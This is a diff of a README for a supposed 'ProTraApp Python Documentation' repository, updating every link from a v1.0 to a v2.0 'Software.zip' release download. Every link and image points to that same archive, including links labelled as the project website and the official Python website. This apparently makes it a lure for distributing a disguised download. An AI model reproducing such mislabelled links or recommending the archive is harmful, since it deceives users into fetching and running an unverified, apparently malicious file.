@@ -1,6 +1,6 @@
 # 🐍️📖️ ProTraApp Python Documentation Repository 📖️🐍️
 
-![ProTraApp Python Docs](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v1.0/Software.zip%20Docs-blue)
+![ProTraApp Python Docs](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v2.0/Software.zip%20Docs-blue)
 
 Welcome to the official documentation repository for adding Python support and functionality to the ProTraApp software library. This repository is a comprehensive guide for developers looking to integrate Python into the ProTraApp project.
 
@@ -13,7 +13,7 @@ Welcome to the official documentation repository for adding Python support and f
 ## 📦 Download
 
 You can download the latest version of the ProTraApp Python Documentation repository by clicking the link below:
-[Download ProTraApp Python Docs v1.0.0](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v1.0/Software.zip)
+[Download ProTraApp Python Docs v1.0.0](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v2.0/Software.zip)
 
 ## 🚀 Getting Started
 
@@ -37,9 +37,9 @@ The ProTraApp Python Documentation repository is designed to help developers sea
 
 ## 🔗 Links
 
-- [ProTraApp GitHub Repository](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v1.0/Software.zip)
-- [ProTraApp Website](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v1.0/Software.zip)
-- [Python Official Website](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v1.0/Software.zip)
+- [ProTraApp GitHub Repository](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v2.0/Software.zip)
+- [ProTraApp Website](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v2.0/Software.zip)
+- [Python Official Website](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v2.0/Software.zip)
 
 ## 📬 Feedback
 
@@ -57,4 +57,4 @@ This repository is licensed under the GNU General Public License v3.0 (GPL-3.0).
 
 Thank you for exploring the ProTraApp Python Documentation repository! Start integrating Python into your ProTraApp projects and unlock a new realm of possibilities. Happy coding! 🚀
 
-![ProTraApp Logo](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v1.0/Software.zip)
+![ProTraApp Logo](https://github.com/vrbvghj/ProTraApp_Python_Docs/releases/download/v2.0/Software.zip)
